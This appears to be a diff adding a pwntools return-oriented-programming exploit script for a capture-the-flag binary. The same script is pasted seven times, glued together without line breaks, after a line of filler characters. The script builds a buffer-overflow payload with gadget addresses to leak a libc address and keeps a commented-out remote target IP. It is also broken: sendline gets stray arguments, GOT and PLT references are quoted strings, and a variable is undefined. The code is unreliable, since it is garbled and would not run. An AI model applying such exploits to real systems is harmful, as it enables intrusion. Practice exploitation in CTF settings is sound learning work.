@@ -1,0 +1,107 @@
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()from pwn import *
+
+#p = remote("94.102.89.31", 31338)
+p = process("/home/marina/Files/pwn/rop_inno/rop")
+elf = ELF("/home/marina/Files/pwn/rop_inno/rop")
+
+p.recvline()
+pop_rdi = 0x40123b # pop rdi; ret
+pop_rsi = 0x401156 # pop rsi; ret
+
+p.recvuntil(b"Hi")
+p.sendline(b'A' * 24 + b'B' * 8 + p64(pop_rdi), b'1', p64(pop_rsi), b"elf.got['read']", b"elf.plt['write']", b"elf.symbols['main']")
+
+leak = p.recv(8)
+leak_read = u64(raw_leak)
+p.interactive()
